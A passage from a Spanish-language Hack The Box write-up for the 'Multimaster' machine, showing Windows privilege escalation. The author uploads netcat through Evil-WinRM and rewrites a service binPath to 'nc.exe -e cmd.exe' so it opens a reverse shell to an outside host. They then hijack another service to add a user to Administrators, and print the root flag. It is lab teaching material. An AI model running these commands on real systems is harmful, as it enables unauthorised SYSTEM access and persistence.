"C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\SQLAGENT.EXE" -i MSSQLSERVER                         True SQLSERVERAGENT   
"C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlceip.exe" -Service                                True SQLTELEMETRY     
"C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"                                                            True SQLWriter        
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1911.3-0\NisSrv.exe"                                              True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1911.3-0\MsMpEng.exe"                                             True WinDefend        
```

Subo el netcat a la máquina víctima para entablarme la reverse shell en un directorio que creo en la raíz

```null
*Evil-WinRM* PS C:\Privesc> upload /opt/nc.exe
Info: Uploading /opt/nc.exe to C:\Privesc\nc.exe

                                                             
Data: 79188 bytes of 79188 bytes copied

Info: Upload successful!
```

Pruebo antes de que no me lo bloquea el AMSI y no tengo problema

Cambio el Bin Path de un servicio

```null
*Evil-WinRM* PS C:\Privesc>  sc.exe config VMTools binPath="C:\Privesc\nc.exe -e cmd.exe 10.10.16.6 443"
[SC] ChangeServiceConfig SUCCESS
```

Mato el servicio para volver a arrancarlo

```null
*Evil-WinRM* PS C:\Privesc> sc.exe stop VMTools
```

Gano acceso como usuario Administrador del Dominio

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.179.
Ncat: Connection from 10.10.10.179:50411.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

No todos los servicios que se muestran admiten esta alteración. Uno típico aunque no aparezca es el browser. Además, para asegurarse la persistencia es más óptimo agregando un usuario del dominio al grupo Administrators

```null
*Evil-WinRM* PS C:\Privesc> sc.exe config browser binPath="C:\Windows\System32\cmd.exe /c net localgroup administrators jorden /add"
[SC] ChangeServiceConfig SUCCESS

*Evil-WinRM* PS C:\Privesc> sc.exe start browser
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

```

<img src="/writeups/assets/img/Multimaster-htb/9.png" alt="">


Y puedo visualizar la segunda flag

```null
*Evil-WinRM* PS C:\Users\jorden\Documents> type C:\Users\Administrator\Desktop\root.txt
cfad62e9ef68d84d6652d6e72b0a0abe
```